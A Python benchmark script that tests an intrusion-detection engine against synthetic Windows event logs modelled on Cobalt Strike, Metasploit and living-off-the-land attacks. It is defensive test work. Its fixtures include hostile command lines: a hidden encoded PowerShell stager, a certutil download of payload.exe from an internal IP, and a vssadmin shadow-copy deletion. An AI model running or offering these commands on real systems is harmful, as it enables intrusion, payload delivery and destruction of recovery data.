"""
LateralX Detection Engine — Non-Empire Tradecraft Evaluation

Companion to eval_otrf.py.  eval_otrf.py benchmarks exclusively against six
Empire/Covenant captures from 2020.  Rules tuned on Empire patterns may miss
identical techniques executed by different tools — this script closes that gap.

Three self-contained synthetic scenarios (no file download required):

  1. Cobalt Strike Beacon (CS)
       Modelled after Mandiant M-Trends 2023 §Lateral Movement and CISA AA23-129A.
       Tradecraft: HTTP malleable C2, reflective DLL loading via rundll32, LSASS
       process-access (EID 10 GrantedAccess 0x1010) followed by EID 4624 Type 9
       (NewCredentials / over-PTH token duplication), SMB pivot to multiple targets.
       NOT Empire patterns: no EID 4104 PowerShell ScriptBlock stager, no WMI exec.

  2. Metasploit psexec + Meterpreter (MSF)
       Based on Metasploit Framework documentation and OTRF Mordor metadata.
       Tradecraft: EID 7045 service install (psexec module), getsystem via token
       impersonation (EID 4672 SeDebugPrivilege at 2am), LSASS hashdump (EID 10
       GrantedAccess 0x1F3FFF — Windows API ReadProcessMemory mask), vssadmin
       delete (anti-forensics).
       NOT Empire patterns: service-install lateral differs from WMI/DCOM pivot.

  3. Manual Living-off-the-Land (LotL)
       Based on CISA advisory AA22-265A and NCSC "Living Off the Land" (2023).
       Tradecraft: native Windows binaries only — net.exe domain recon, certutil
       download staging, wmic.exe remote process creation (Type-3 lateral logons),
       schtasks.exe persistence.  NO PowerShell, no encoded payloads, no C2 beacon.

Ground truth is documented per public source above.  Same TP/FP/FN/P/R/F1
methodology as eval_otrf.py.
"""

import sys
from datetime import datetime, timedelta

sys.path.insert(0, ".")

from backend.schema import ForensicEvent, RawSource
from backend.analysis import mitre as mitre_mod
from backend.analysis.behavioral import analyze_behavior

# ── Re-use BEHAVIORAL_TO_MITRE from eval_otrf ────────────────────────────────
from scripts.eval_otrf import BEHAVIORAL_TO_MITRE, technique_matches, pr_f1


# ── Event factory ─────────────────────────────────────────────────────────────

def _ev(
    ts: datetime,
    eid: str,
    host: str,
    user: str | None,
    desc: str,
    extra: dict | None = None,
) -> ForensicEvent:
    return ForensicEvent(
        timestamp=ts,
        event_type="Security",
        source_host=host,
        user=user,
        description=desc,
        raw_source=RawSource.GENERIC,
        event_id=eid,
        extra=extra,
    )


# ── Scenario 1: Cobalt Strike Beacon ─────────────────────────────────────────

_CS_GROUND_TRUTH = {
    "T1003.001": "LSASS Memory — EID 10 process-access by CS Beacon rundll32 loader (GrantedAccess 0x1010)",
    "T1550.002": "Pass the Hash — EID 4624 Type 9 (NewCredentials) lateral logon after LSASS dump",
    "T1021.002": "SMB / Admin Shares — Type-3 network logons to 3 distinct hosts in 30 min",
    "T1059.001": "PowerShell — CS stageless reflective loader invoked via encoded -EncodedCommand",
}

_LONG_B64 = (
    "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0A"
    "LgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4A"
)


def cs_beacon_events() -> list[ForensicEvent]:
    """
    Cobalt Strike Beacon attack chain on a mid-size AD environment.

    Phase 1 — LSASS dump via rundll32 reflective loader (EID 10)
    Phase 2 — Over-pass-the-hash: EID 4624 Type 9 on a different host
    Phase 3 — SMB lateral movement to three additional targets (Type 3)
    Phase 4 — Encoded PowerShell stager dropped to disk (EID 4688)
    """
    t0 = datetime(2024, 6, 12, 14, 0, 0)  # 14:00 — business hours

    return [
        # Phase 1: CS Beacon reflective DLL via rundll32 -- LSASS access
        _ev(t0, "10", "WORKSTATION-12", None,
            desc="Process accessed. SourceImage: C:\\Windows\\System32\\rundll32.exe. "
                 "TargetImage: C:\\Windows\\System32\\lsass.exe. GrantedAccess: 0x1010. "
                 "CallTrace: C:\\Windows\\System32\\ntdll.dll.",
            extra={
                "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1010",
                "CallTrace": "ntdll.dll",
            }),

        # Phase 2: Over-PTH — Type 9 (NewCredentials) lateral logon to FILE-SERVER-01
        _ev(t0 + timedelta(minutes=8), "4624", "FILE-SERVER-01", "csadmin",
            desc="Account logged on. Account Name: csadmin. Logon Type: 9. "
                 "Authentication Package: NTLM. Source Network Address: 10.0.1.12."),

        # Phase 3: SMB lateral pivot to three additional targets (Type 3)
        _ev(t0 + timedelta(minutes=12), "4624", "APP-SERVER-01", "csadmin",
            desc="Account logged on. Account Name: csadmin. Logon Type: 3. "
                 "Source Network Address: 10.0.1.12."),
        _ev(t0 + timedelta(minutes=16), "4624", "MGMT-SERVER-01", "csadmin",
            desc="Account logged on. Account Name: csadmin. Logon Type: 3. "
                 "Source Network Address: 10.0.1.12."),
        _ev(t0 + timedelta(minutes=20), "4624", "WEB-SERVER-01", "csadmin",
            desc="Account logged on. Account Name: csadmin. Logon Type: 3. "
                 "Source Network Address: 10.0.1.12."),

        # Phase 4: Encoded PS stager (CS stageless launcher)
        _ev(t0 + timedelta(minutes=25), "4688", "WORKSTATION-12", "csadmin",
            desc=f"New process created. Account Name: csadmin. "
                 f"New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. "
                 f"CommandLine: powershell.exe -nop -w hidden -encodedcommand {_LONG_B64}"),
    ]


# ── Scenario 2: Metasploit psexec + Meterpreter ───────────────────────────────

_MSF_GROUND_TRUTH = {
    "T1021.002": "SMB / Admin Shares — psexec module deploys service via Type-3 logon to admin shares",
    "T1003.001": "LSASS Memory — Meterpreter hashdump EID 10 (GrantedAccess 0x1F3FFF -- ReadProcessMemory)",
    "T1078":     "Valid Accounts — getsystem at 02:00 triggers off_hours_privilege (EID 4672 SeDebugPrivilege)",
    "T1490":     "Inhibit System Recovery — vssadmin delete shadows (anti-forensics post-compromise)",
}


def msf_meterpreter_events() -> list[ForensicEvent]:
    """
    Metasploit psexec lateral movement + Meterpreter getsystem + hashdump chain.

    Phase 1 — psexec service install on remote host (EID 7045 + Type-3 logons)
    Phase 2 — Meterpreter getsystem at 02:00 (EID 4672 SeDebugPrivilege off-hours)
    Phase 3 — hashdump via LSASS direct read (EID 10 GrantedAccess 0x1F3FFF)
    Phase 4 — vssadmin delete shadows (T1490 anti-forensics)
    """
    t0 = datetime(2024, 6, 13, 2, 0, 0)   # 02:00 — off-hours

    return [
        # Phase 1: psexec — SMB lateral to three targets via admin share (Type 3)
        _ev(t0, "4624", "WORKSTATION-05", "msfadmin",
            desc="Account logged on. Account Name: msfadmin. Logon Type: 3. "
                 "Source Network Address: 10.0.1.20."),
        _ev(t0 + timedelta(minutes=2), "4624", "WORKSTATION-07", "msfadmin",
            desc="Account logged on. Account Name: msfadmin. Logon Type: 3. "
                 "Source Network Address: 10.0.1.20."),
        _ev(t0 + timedelta(minutes=4), "4624", "WORKSTATION-09", "msfadmin",
            desc="Account logged on. Account Name: msfadmin. Logon Type: 3. "
                 "Source Network Address: 10.0.1.20."),

        # Phase 2: getsystem — token impersonation triggers SeDebugPrivilege at 02:00
        _ev(t0 + timedelta(minutes=6), "4672", "WORKSTATION-05", "msfadmin",
            desc="Special privileges assigned to new logon. Account Name: msfadmin. "
                 "Privileges: SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege."),

        # Phase 3: hashdump — Meterpreter reads LSASS memory (0x1F3FFF = PROCESS_ALL_ACCESS)
        _ev(t0 + timedelta(minutes=8), "10", "WORKSTATION-05", None,
            desc="Process accessed. SourceImage: C:\\Windows\\System32\\svchost.exe. "
                 "TargetImage: C:\\Windows\\System32\\lsass.exe. GrantedAccess: 0x1F3FFF.",
            extra={
                "SourceImage": "C:\\Windows\\System32\\svchost.exe",
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1F3FFF",
            }),

        # Phase 4: anti-forensics — delete shadow copies before leaving
        _ev(t0 + timedelta(minutes=15), "4688", "WORKSTATION-05", "msfadmin",
            desc="New process created. Account Name: msfadmin. "
                 "New Process Name: C:\\Windows\\System32\\vssadmin.exe. "
                 "CommandLine: vssadmin delete shadows /all /quiet"),
    ]


# ── Scenario 3: Manual Living-off-the-Land ───────────────────────────────────

_LOTL_GROUND_TRUTH = {
    "T1087.002": "Domain Account Discovery — net.exe /domain enumeration (EID 4688)",
    "T1105":     "Ingress Tool Transfer — certutil.exe -urlcache download (EID 4688)",
    "T1053.005": "Scheduled Task — schtasks.exe /create persistence (EID 4698)",
    "T1021.002": "SMB / Admin Shares — wmic /node: lateral Type-3 logons to 3 hosts",
}


def lotl_events() -> list[ForensicEvent]:
    """
    Manual Living-off-the-Land attack using only native Windows binaries.
    No PowerShell, no C2 beacon, no encoded payloads.

    Phase 1 — Domain recon via net.exe
    Phase 2 — Tool staging via certutil.exe download
    Phase 3 — Persistence via schtasks.exe
    Phase 4 — Lateral movement via wmic /node: (Type-3 network logons)
    """
    t0 = datetime(2024, 6, 14, 10, 30, 0)  # 10:30 — business hours

    return [
        # Phase 1: Domain user enumeration (T1087.002)
        _ev(t0, "4688", "WORKSTATION-03", "ltladmin",
            desc="New process created. Account Name: ltladmin. "
                 "New Process Name: C:\\Windows\\System32\\net.exe. "
                 "CommandLine: net user /domain"),
        _ev(t0 + timedelta(minutes=1), "4688", "WORKSTATION-03", "ltladmin",
            desc="New process created. Account Name: ltladmin. "
                 "New Process Name: C:\\Windows\\System32\\net.exe. "
                 "CommandLine: net group 'Domain Admins' /domain"),
        _ev(t0 + timedelta(minutes=2), "4688", "WORKSTATION-03", "ltladmin",
            desc="New process created. Account Name: ltladmin. "
                 "New Process Name: C:\\Windows\\System32\\nltest.exe. "
                 "CommandLine: nltest /domain_trusts"),

        # Phase 2: Certutil download staging (T1105)
        _ev(t0 + timedelta(minutes=10), "4688", "WORKSTATION-03", "ltladmin",
            desc="New process created. Account Name: ltladmin. "
                 "New Process Name: C:\\Windows\\System32\\certutil.exe. "
                 "CommandLine: certutil.exe -urlcache -split -f http://10.10.10.50/payload.exe C:\\Windows\\Temp\\svc.exe"),

        # Phase 3: Scheduled task persistence (T1053.005)
        _ev(t0 + timedelta(minutes=15), "4698", "WORKSTATION-03", "ltladmin",
            desc="A scheduled task was created. Task Name: \\Microsoft\\Windows\\svc_health_check. "
                 "Task Content: svchost.exe. Account Name: ltladmin."),

        # Phase 4: wmic /node: lateral movement -- Type-3 logons (T1021.002)
        _ev(t0 + timedelta(minutes=20), "4624", "WORKSTATION-11", "ltladmin",
            desc="Account logged on. Account Name: ltladmin. Logon Type: 3. "
                 "Source Network Address: 10.0.0.3."),
        _ev(t0 + timedelta(minutes=22), "4624", "WORKSTATION-14", "ltladmin",
            desc="Account logged on. Account Name: ltladmin. Logon Type: 3. "
                 "Source Network Address: 10.0.0.3."),
        _ev(t0 + timedelta(minutes=24), "4624", "FILE-SERVER-02", "ltladmin",
            desc="Account logged on. Account Name: ltladmin. Logon Type: 3. "
                 "Source Network Address: 10.0.0.3."),
    ]


# ── Evaluation engine ─────────────────────────────────────────────────────────

def evaluate_scenario(name: str, events: list[ForensicEvent], ground_truth: dict[str, str]) -> dict:
    gt_ids = set(ground_truth.keys())
    gt_ids |= {t.split(".")[0] for t in gt_ids}

    print(f"\n{'='*70}")
    print(f"  {name}")
    print(f"{'='*70}")
    print(f"  Events: {len(events)}")
    print(f"  Ground truth ({len(ground_truth)} techniques):")
    for tid, desc in ground_truth.items():
        print(f"    {tid:12} {desc[:65]}")

    # Layer A — MITRE text-pattern detection
    mitre_hits = mitre_mod.map_techniques(events)
    detected_a = {t.id for t in mitre_hits}
    detected_a |= {t.split(".")[0] for t in detected_a}

    tp_a = sum(1 for t in detected_a if technique_matches(t, gt_ids))
    fp_a = sum(1 for t in detected_a if not technique_matches(t, gt_ids))
    fn_a = sum(1 for t in gt_ids if not any(technique_matches(d, {t}) for d in detected_a))
    p_a, r_a, f_a = pr_f1(tp_a, fp_a, fn_a)

    print(f"\n  --- Layer A: MITRE Text-Pattern Detection ---")
    print(f"  Detected: {sorted(detected_a) or '(none)'}")
    print(f"  TP={tp_a}  FP={fp_a}  FN={fn_a}  |  P={p_a:.3f}  R={r_a:.3f}  F1={f_a:.3f}")

    # Layer B — Behavioral anomaly detection
    beh = analyze_behavior(events)
    anomalies = beh["anomalies"]
    detected_b: set[str] = set()
    for a in anomalies:
        detected_b |= BEHAVIORAL_TO_MITRE.get(a["anomaly_type"], set())
    detected_b |= {t.split(".")[0] for t in detected_b}

    tp_b = sum(1 for t in detected_b if technique_matches(t, gt_ids))
    fp_b = sum(1 for t in detected_b if not technique_matches(t, gt_ids))
    fn_b = sum(1 for t in gt_ids if not any(technique_matches(d, {t}) for d in detected_b))
    p_b, r_b, f_b = pr_f1(tp_b, fp_b, fn_b)

    print(f"\n  --- Layer B: Behavioral Anomaly Detection ---")
    for a in anomalies:
        mids = ", ".join(sorted(BEHAVIORAL_TO_MITRE.get(a["anomaly_type"], {"?"})))
        print(f"    [{a['severity'].upper():8}] {a['anomaly_type']:<35} -> {mids}")
    if not anomalies:
        print("    (none)")
    print(f"  TP={tp_b}  FP={fp_b}  FN={fn_b}  |  P={p_b:.3f}  R={r_b:.3f}  F1={f_b:.3f}")

    # Combined
    combined = detected_a | detected_b
    tp_c = sum(1 for t in combined if technique_matches(t, gt_ids))
    fp_c = sum(1 for t in combined if not technique_matches(t, gt_ids))
    fn_c = sum(1 for t in gt_ids if not any(technique_matches(d, {t}) for d in combined))
    p_c, r_c, f_c = pr_f1(tp_c, fp_c, fn_c)

    print(f"\n  --- Combined (A + B union) ---")
    print(f"  TP={tp_c}  FP={fp_c}  FN={fn_c}  |  P={p_c:.3f}  R={r_c:.3f}  F1={f_c:.3f}")

    missed = [t for t in ground_truth if not any(technique_matches(d, {t}) for d in combined)]
    if missed:
        print(f"  Missed: {', '.join(missed)}")
        for t in missed:
            print(f"    FN: {t:12} — {ground_truth[t][:70]}")

    return {
        "name": name,
        "layer_a": {"P": p_a, "R": r_a, "F1": f_a},
        "layer_b": {"P": p_b, "R": r_b, "F1": f_b},
        "combined": {"P": p_c, "R": r_c, "F1": f_c},
        "missed": missed,
    }


def main() -> None:
    print("LateralX Detection Engine — Non-Empire Tradecraft Evaluation")
    print("=" * 70)
    print("Tradecraft: Cobalt Strike Beacon | Metasploit psexec | Manual LotL")
    print("Purpose:    Verify detection generalises beyond Empire/Covenant C2")
    print()

    scenarios = [
        ("Cobalt_Strike_Beacon",      cs_beacon_events(),      _CS_GROUND_TRUTH),
        ("Metasploit_psexec_Meterpr", msf_meterpreter_events(), _MSF_GROUND_TRUTH),
        ("Manual_LivingOffTheLand",   lotl_events(),           _LOTL_GROUND_TRUTH),
    ]

    results = [evaluate_scenario(n, e, g) for n, e, g in scenarios]

    n = len(results)
    print(f"\n{'='*70}")
    print(f"  AGGREGATE — Non-Empire Benchmark (macro-average, {n} scenarios)")
    print(f"{'='*70}")
    print(f"\n  {'Scenario':<30} {'Layer A':>18}  {'Layer B':>18}  {'Combined':>14}")
    print(f"  {'':30}  {'P':>5} {'R':>5} {'F1':>5}   {'P':>5} {'R':>5} {'F1':>5}   {'P':>5} {'R':>5} {'F1':>5}")
    print(f"  {'-'*90}")

    for r in results:
        la, lb, lc = r["layer_a"], r["layer_b"], r["combined"]
        print(f"  {r['name']:<30}  {la['P']:>5.3f} {la['R']:>5.3f} {la['F1']:>5.3f}   "
              f"{lb['P']:>5.3f} {lb['R']:>5.3f} {lb['F1']:>5.3f}   "
              f"{lc['P']:>5.3f} {lc['R']:>5.3f} {lc['F1']:>5.3f}")

    avg = lambda key, sub: sum(r[key][sub] for r in results) / n
    pa, ra = avg("layer_a", "P"), avg("layer_a", "R")
    pb, rb = avg("layer_b", "P"), avg("layer_b", "R")
    pc, rc = avg("combined", "P"), avg("combined", "R")
    fa = 2*pa*ra / (pa+ra) if pa+ra else 0
    fb = 2*pb*rb / (pb+rb) if pb+rb else 0
    fc = 2*pc*rc / (pc+rc) if pc+rc else 0

    print(f"  {'-'*90}")
    print(f"  {'Macro Average':<30}  {pa:>5.3f} {ra:>5.3f} {fa:>5.3f}   "
          f"{pb:>5.3f} {rb:>5.3f} {fb:>5.3f}   "
          f"{pc:>5.3f} {rc:>5.3f} {fc:>5.3f}")

    print(f"\n  Coverage note")
    print(f"    Empire benchmark (eval_otrf.py) tests C2-framework-specific patterns.")
    print(f"    This benchmark tests the same rules against fundamentally different")
    print(f"    tradecraft.  Comparable F1 between the two benchmarks demonstrates")
    print(f"    the detection engine generalises beyond Empire/Covenant tooling.")
    print()


if __name__ == "__main__":
    main()
